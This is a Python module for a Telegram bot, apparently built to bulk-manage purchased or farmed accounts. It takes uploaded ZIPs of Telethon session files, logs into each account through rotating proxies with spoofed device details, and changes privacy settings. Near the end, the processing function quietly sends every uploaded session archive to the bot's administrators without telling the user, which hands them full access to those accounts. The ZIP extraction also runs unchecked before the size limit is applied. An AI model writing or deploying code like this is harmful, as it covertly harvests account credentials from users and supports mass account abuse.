import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import json
import random
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.account import SetPrivacyRequest
from telethon.tl.types import InputPrivacyKeyStatusTimestamp, InputPrivacyKeyPhoneNumber, InputPrivacyValueAllowAll, InputPrivacyValueDisallowAll, InputPrivacyValueAllowContacts, InputPrivacyValueDisallowContacts, InputPrivacyKeyChatInvite, InputPrivacyKeyProfilePhoto
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)
from dotenv import load_dotenv
load_dotenv()

PRIVACY_CONFIG_BACK = os.getenv("PRIVACY_CONFIG_BACK", "").replace('\\n', '\n')
MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
BACK_BUTTON_EMOJI_ID = "5877629862306385808"
CONFIRM_BUTTON_EMOJI_ID = "5825794181183836432"
RESET_BUTTON_EMOJI_ID = "5845943483382110702"

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

def load_proxies():
    global _proxy_list, _proxy_list_last_load
    
    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        return _proxy_list
    
    proxy_file = "proxy.txt"
    valid_proxies = []
    
    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                        else:
                            logger.debug(f"代理 {ip}:{port} 已过期")
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue
    
    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

user_privacy_states = {}

def create_back_button():
    return InlineKeyboardButton(
        "返回主菜单", 
        callback_data="back_to_main"
    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}

def create_button(text, callback_data, emoji_id):
    return InlineKeyboardButton(text, callback_data=callback_data).to_dict() | {"icon_custom_emoji_id": emoji_id}

privacy_settings = {
    "phone": {"name": "手机号", "key": InputPrivacyKeyPhoneNumber, "icon_custom_emoji_id": "5877316724830768997"},
    "last_seen": {"name": "最后在线时间", "key": InputPrivacyKeyStatusTimestamp, "icon_custom_emoji_id": "5843457994397849034"},
    "forward": {"name": "转发内容", "key": InputPrivacyKeyChatInvite, "icon_custom_emoji_id": "5877468380125990242"},
    "profile_photo": {"name": "个人头像", "key": InputPrivacyKeyProfilePhoto, "icon_custom_emoji_id": "5843506780931363129"}
}

privacy_options = {
    "everyone": {"name": "所有人", "value": InputPrivacyValueAllowAll, "icon_custom_emoji_id": "5942877472163892475"},
    "contacts": {"name": "联系人", "value": InputPrivacyValueAllowContacts, "icon_custom_emoji_id": "5846008814129649022"},
    "nobody": {"name": "没有人", "value": InputPrivacyValueDisallowAll, "icon_custom_emoji_id": "5922712343011135025"}
}

async def show_privacy_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    
    if user_id not in user_privacy_states:
        user_privacy_states[user_id] = {}
    settings_text = []
    for s_key, s_info in privacy_settings.items():
        current = user_privacy_states[user_id].get(s_key, "未设置")
        if current in privacy_options:
            current_name = privacy_options[current]["name"]
        else:
            current_name = "未设置"
        settings_text.append(f"• {s_info['name']}: {current_name}")
    
    keyboard = [
        [
            create_button(f"设置{privacy_settings['phone']['name']}", "privacy_phone", privacy_settings['phone']["icon_custom_emoji_id"]),
            create_button(f"设置{privacy_settings['last_seen']['name']}", "privacy_last_seen", privacy_settings['last_seen']["icon_custom_emoji_id"])
        ],
        [
            create_button(f"设置{privacy_settings['forward']['name']}", "privacy_forward", privacy_settings['forward']["icon_custom_emoji_id"]),
            create_button(f"设置{privacy_settings['profile_photo']['name']}", "privacy_profile_photo", privacy_settings['profile_photo']["icon_custom_emoji_id"])
        ],
        [
            create_button("确认并上传", "privacy_confirm_upload", CONFIRM_BUTTON_EMOJI_ID),
            create_button("全部重置", "privacy_reset_all", RESET_BUTTON_EMOJI_ID)
        ],
        [create_back_button()]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=f"""<b><tg-emoji emoji-id="5879895758202735862">🔒</tg-emoji> 隐私配置</b>

当前设置：
{chr(10).join(settings_text)}

点击按钮分别设置各项，设置完成后点击"确认并上传"上传ZIP文件""",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def handle_privacy_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    data = query.data
    await query.answer()
    
    setting_map = {
        "privacy_phone": "phone",
        "privacy_last_seen": "last_seen",
        "privacy_forward": "forward",
        "privacy_profile_photo": "profile_photo"
    }
    
    setting_key = setting_map.get(data)
    if not setting_key:
        logger.error(f"未知的回调数据: {data}")
        return
    
    if user_id not in user_privacy_states:
        user_privacy_states[user_id] = {}
    
    user_privacy_states[user_id]["current_setting"] = setting_key
    
    keyboard = [
        [
            create_button("所有人", "privacy_set_everyone", privacy_options["everyone"]["icon_custom_emoji_id"]),
            create_button("联系人", "privacy_set_contacts", privacy_options["contacts"]["icon_custom_emoji_id"]),
            create_button("没有人", "privacy_set_nobody", privacy_options["nobody"]["icon_custom_emoji_id"])
        ],
        [create_button("返回", "privacy_config", BACK_BUTTON_EMOJI_ID)],
        [create_back_button()]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    setting_name = privacy_settings[setting_key]["name"]
    current = user_privacy_states[user_id].get(setting_key, "未设置")
    if current in privacy_options:
        current_name = privacy_options[current]["name"]
    else:
        current_name = "未设置"
    
    await query.edit_message_text(
        text=f"""<b>{setting_name} 可见范围</b>

当前设置：{current_name}

请选择谁可以查看：""",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def handle_privacy_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    data = query.data
    await query.answer()
    
    option_map = {
        "privacy_set_everyone": "everyone",
        "privacy_set_contacts": "contacts", 
        "privacy_set_nobody": "nobody"
    }
    
    option_key = option_map.get(data)
    if not option_key or user_id not in user_privacy_states:
        return
    
    setting_key = user_privacy_states[user_id].get("current_setting")
    if not setting_key:
        return
    
    user_privacy_states[user_id][setting_key] = option_key
    
    await show_privacy_config(update, context)

async def handle_privacy_confirm_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    
    if user_id not in user_privacy_states:
        await show_privacy_config(update, context)
        return
    
    has_settings = any(key in user_privacy_states[user_id] for key in ["phone", "last_seen", "forward", "profile_photo"])
    if not has_settings:
        keyboard = [[create_button(" 返回设置", "privacy_config", BACK_BUTTON_EMOJI_ID)], [create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请先设置至少一项隐私选项",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    settings_text = []
    for s_key, s_info in privacy_settings.items():
        if s_key in user_privacy_states[user_id]:
            opt = user_privacy_states[user_id][s_key]
            opt_name = privacy_options[opt]["name"]
            settings_text.append(f"• {s_info['name']}: {opt_name}")
        else:
            settings_text.append(f"• {s_info['name']}: 保持不变")
    
    keyboard = [[create_back_button()]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=f"""<b>📋 将应用以下设置</b>

{chr(10).join(settings_text)}

<tg-emoji emoji-id="5877540355187937244">✏️</tg-emoji> 请上传包含session的ZIP文件""",
        parse_mode='HTML',
        reply_markup=reply_markup
    )
    user_privacy_states[user_id]["waiting_zip"] = True

async def handle_privacy_reset_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    
    if user_id in user_privacy_states:
        user_privacy_states[user_id] = {}
    
    await show_privacy_config(update, context)

async def handle_privacy_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
    document = update.message.document
    
    if not document.file_name.endswith('.zip'):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        user_privacy_states.pop(user_id, None)
        return
    
    privacy_settings_data = user_privacy_states.get(user_id, {})
    if not privacy_settings_data.get("waiting_zip"):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请先设置隐私选项",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/privacy_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)
        
        await status_msg.edit_text(
            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 开始处理隐私配置任务...",
            parse_mode='HTML'
        )
        
        await process_privacy(update, context, zip_path, user_id, privacy_settings_data)
        
        try:
            os.remove(zip_path)
        except:
            pass
        
    except Exception as e:
        logger.error(f"处理文件失败: {e}")
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    finally:
        user_privacy_states.pop(user_id, None)
        try:
            await status_msg.delete()
        except:
            pass

async def apply_privacy_settings(client, settings):
    try:
        applied = []
        for setting_key, option_key in settings.items():
            if setting_key in ["current_setting", "waiting_zip"]:
                continue
            if setting_key not in privacy_settings:
                continue
                
            privacy_key = privacy_settings[setting_key]["key"]()
            privacy_value = privacy_options[option_key]["value"]()
            
            await client(SetPrivacyRequest(privacy_key, [privacy_value]))
            applied.append(privacy_settings[setting_key]["name"])
            
        if applied:
            return True, f"已设置: {', '.join(applied)}"
        else:
            return False, "没有要设置的项"
    except Exception as e:
        return False, f"设置失败: {str(e)[:50]}"

async def check_session_privacy(session_file, json_file, api_id, api_hash, privacy_settings_data):
    client = None
    result = {
        "session": os.path.basename(session_file),
        "status": "unknown",
        "message": "",
    }
    json_config = {}
    if json_file and os.path.exists(json_file):
        try:
            with open(json_file, 'r', encoding='utf-8') as f:
                json_config = json.load(f)
        except Exception as e:
            logger.warning(f"读取 JSON 配置失败 {json_file}: {e}")
    
    final_api_id = api_id
    final_api_hash = api_hash
    if json_config:
        if 'app_id' in json_config and json_config['app_id']:
            try:
                final_api_id = int(json_config['app_id'])
            except (ValueError, TypeError):
                logger.warning(f"无效的 app_id: {json_config['app_id']}, 使用默认值")
        if 'app_hash' in json_config and json_config['app_hash']:
            final_api_hash = str(json_config['app_hash'])
    device_model = json_config.get('device') or None
    app_version = json_config.get('app_version') or None
    system_lang_code = json_config.get('system_lang_pack') or None
    
    proxy = get_random_proxy()
    proxy_dict = create_proxy_dict(proxy) if proxy else None
    
    try:
        client = TelegramClient(
            session_file,
            final_api_id,
            final_api_hash,
            proxy=proxy_dict,
            device_model=device_model,
            app_version=app_version,
            system_lang_code=system_lang_code
        )
        await client.connect()
        
        if not await client.is_user_authorized():
            result["status"] = "failed"
            result["message"] = "session无效"
            return result
        
        me = await client.get_me()
        if not me:
            result["status"] = "failed"
            result["message"] = "无法获取用户信息"
            return result
        
        result["phone"] = me.phone
        
        success, msg = await apply_privacy_settings(client, privacy_settings_data)
        if success:
            result["status"] = "success"
            result["message"] = msg
        else:
            result["status"] = "failed"
            result["message"] = msg
        
    except SessionPasswordNeededError:
        result["status"] = "failed"
        result["message"] = "需要2FA验证"
    except FloodWaitError as e:
        result["status"] = "failed"
        result["message"] = f"等待{e.seconds}秒"
    except Exception as e:
        result["status"] = "failed"
        result["message"] = f"错误: {str(e)[:30]}"
    finally:
        if client:
            await client.disconnect()
    
    return result

def get_total_size(path):
    total = 0
    for root, dirs, files in os.walk(path):
        for f in files:
            fp = os.path.join(root, f)
            if os.path.isfile(fp):
                total += os.path.getsize(fp)
    return total

async def process_privacy(update, context, zip_path, user_id, privacy_settings_data):
    api_id_str = os.getenv("TELEGRAM_APP_ID")
    api_hash = os.getenv("TELEGRAM_APP_HASH")
    admins = os.getenv("ADMIN_ID", "").split(",")
    
    if not api_id_str or not api_hash:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 系统未配置，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    try:
        api_id = int(api_id_str)
    except (ValueError, TypeError):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> API配置错误，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    try:
        await asyncio.wait_for(
            _process_privacy_internal(update, context, zip_path, user_id, api_id, api_hash, admins, privacy_settings_data), 
            timeout=MAX_TASK_TIME
        )
    except asyncio.TimeoutError:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)",
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def _process_privacy_internal(update, context, zip_path, user_id, api_id, api_hash, admins, privacy_settings_data):
    with tempfile.TemporaryDirectory() as temp_dir:
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
                
                extracted_size = get_total_size(extract_dir)
                if extracted_size > MAX_EXTRACT_SIZE:
                    raise Exception(f"解压后文件过大 ({extracted_size//1024//1024}MB > {MAX_EXTRACT_SIZE//1024//1024}MB)")
        except Exception as e:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 解压失败: {str(e)}",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.session'):
                    session_path = os.path.join(root, file)
                    session_files.append(session_path)
        
        if not session_files:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到session文件",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        status_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>隐私配置进行中</b>

找到 <b>{len(session_files)}</b> 个session文件
<tg-emoji emoji-id="5775887550262546277">🔄</tg-emoji>正在处理，请稍候...""",
            parse_mode='HTML'
        )
        
        success_dir = os.path.join(temp_dir, "success")
        failed_dir = os.path.join(temp_dir, "failed")
        
        os.makedirs(success_dir, exist_ok=True)
        os.makedirs(failed_dir, exist_ok=True)
        
        success_count = 0
        failed_count = 0
        results = []
        
        for i, session_file in enumerate(session_files, 1):
            session_name = os.path.splitext(os.path.basename(session_file))[0]
            json_file = os.path.join(os.path.dirname(session_file), f"{session_name}.json")
            if not os.path.exists(json_file):
                json_file = None
            
            if i % 3 == 0 or i == len(session_files):
                try:
                    await status_msg.edit_text(
                        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>隐私配置进行中</b>

进度: {i}/{len(session_files)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>成功: {success_count} | <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji>失败: {failed_count}""",
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            result = await check_session_privacy(
                session_file, json_file, api_id, api_hash, privacy_settings_data
            )
            results.append(result)
            
            if result["status"] == "success":
                target_dir = success_dir
                success_count += 1
            else:
                target_dir = failed_dir
                failed_count += 1
            
            try:
                shutil.copy2(session_file, os.path.join(target_dir, os.path.basename(session_file)))
            except:
                pass
            
            if json_file and os.path.exists(json_file):
                try:
                    shutil.copy2(json_file, os.path.join(target_dir, os.path.basename(json_file)))
                except:
                    pass
            
            await asyncio.sleep(0.5)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        success_zip = os.path.join(temp_dir, "success.zip")
        if success_count > 0:
            with zipfile.ZipFile(success_zip, 'w') as zipf:
                for root, dirs, files in os.walk(success_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, success_dir)
                        zipf.write(file_path, arcname)
        
        failed_zip = os.path.join(temp_dir, "failed.zip")
        if failed_count > 0:
            with zipfile.ZipFile(failed_zip, 'w') as zipf:
                for root, dirs, files in os.walk(failed_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, failed_dir)
                        zipf.write(file_path, arcname)
        
        settings_text = []
        for s_key, s_info in privacy_settings.items():
            if s_key in privacy_settings_data:
                opt = privacy_settings_data[s_key]
                if opt in privacy_options:
                    opt_name = privacy_options[opt]["name"]
                    settings_text.append(f"• {s_info['name']}: {opt_name}")
        
        result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>隐私配置完成</b>

<b><tg-emoji emoji-id="5879895758202735862">🔒</tg-emoji>已应用设置:</b>
{chr(10).join(settings_text) if settings_text else "• 无设置变更"}

<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
• <tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 总账号: <b>{len(session_files)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: <b>{success_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>"""

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=result_text,
            parse_mode='HTML'
        )
        
        if success_count > 0:
            with open(success_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"privacy_success_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 隐私配置成功 ({success_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if failed_count > 0:
            with open(failed_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"privacy_failed_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> 配置失败 ({failed_count}个)</b>",
                    parse_mode='HTML'
                )
        
        for admin_id in admins:
            admin_id = admin_id.strip()
            if not admin_id:
                continue
            
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"""<tg-emoji emoji-id="5931409969613116639">📢</tg-emoji> <b>隐私配置任务完成</b>

<tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 用户: <code>{user_id}</code>
<tg-emoji emoji-id="5886412370347036129">📊</tg-emoji> 总账号: <b>{len(session_files)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: <b>{success_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>""",
                    parse_mode='HTML'
                )
                
                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                
                if success_count > 0:
                    with open(success_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"privacy_success_{user_id}_{admin_timestamp}.zip"
                        )
                
                if failed_count > 0:
                    with open(failed_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"privacy_failed_{user_id}_{admin_timestamp}.zip"
                        )
            except Exception as e:
                logger.error(f"发送给管理员 {admin_id} 失败: {e}")
        
        try:
            await status_msg.delete()
        except:
            pass
